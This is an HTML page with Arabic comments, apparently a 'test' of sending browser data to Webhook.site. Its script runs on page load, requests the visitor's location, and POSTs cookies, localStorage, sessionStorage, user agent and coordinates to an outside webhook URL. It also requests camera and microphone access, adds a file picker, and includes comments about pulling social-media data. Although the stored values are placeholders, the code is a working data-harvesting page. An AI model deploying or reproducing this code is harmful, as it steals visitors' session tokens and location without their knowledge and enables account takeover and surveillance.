<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال بيانات إلى Webhook</title>
</head>
<body>
    <h1>اختبار إرسال البيانات إلى Webhook.site</h1>
    <script>
        // إضافة بعض الكوكيز يدويًا
        document.cookie = "user=JohnDoe; path=/";
        document.cookie = "session=12345; path=/";

        // إضافة بعض البيانات إلى localStorage و sessionStorage
        localStorage.setItem('username', 'testUser');
        localStorage.setItem('email', 'test@example.com');
        sessionStorage.setItem('sessionId', '12345');
        sessionStorage.setItem('lastLogin', '2025-04-16');

        // إرسال بيانات الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(function(position) {
            // إرسال البيانات إلى Webhook.site
            fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    cookies: document.cookie,  // إرسال الكوكيز
                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
                    localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
                    userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
                    time: new Date().toISOString(),  // الوقت الحالي
                    location: {  // إرسال الموقع الجغرافي
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    }
                })
            })
            .then(response => response.json())
            .then(data => console.log("تم إرسال البيانات بنجاح:", data))
            .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
        }, function(error) {
            console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
        });

        // الوصول إلى الكاميرا أو الميكروفون
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                console.log("تم الوصول إلى الكاميرا والميكروفون بنجاح");
                // إيقاف البث بعد الوصول
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(function(error) {
                console.log("حدث خطأ أثناء الوصول إلى الكاميرا أو الميكروفون: ", error);
            });

        // الوصول إلى الملفات
        function handleFileSelect(event) {
            const file = event.target.files[0];
            if (file) {
                console.log("تم اختيار الملف:", file.name);
                // إرسال الملف أو معالجته كما تريد
            }
        }

        // إضافة زر لاختيار ملف
        let fileInput = document.createElement("input");
        fileInput.type = "file";
        fileInput.addEventListener("change", handleFileSelect);
        document.body.appendChild(fileInput);

        // إلغاء إذن الوصول إلى الكاميرا أو الميكروفون: يمكن إيقاف تدفق البيانات ولكن يجب على المستخدم إلغاء الإذن يدويًا من خلال إعدادات المتصفح.
        // إلغاء إذن الإشعارات: لا يمكن إلغاؤه عبر JavaScript، ولكن يمكن إيقافه من خلال إعدادات المتصفح.
        // إلغاء الكوكيز أو بيانات التخزين: يمكن حذفها باستخدام الكود.
        // إلغاء إذن الموقع الجغرافي: يتطلب إيقافه من إعدادات المتصفح.

        // (اختياري) يمكنك دمج API لمنصات التواصل الاجتماعي للحصول على بيانات مثل الفيسبوك أو جوجل
        // على سبيل المثال، إذا أردت جمع بيانات الفيسبوك، تحتاج إلى استخدام Facebook Graph API
        // هذا يتطلب أن يوافق المستخدم على منح إذن للوصول إلى بياناته.
    </script>
</body>
</html>
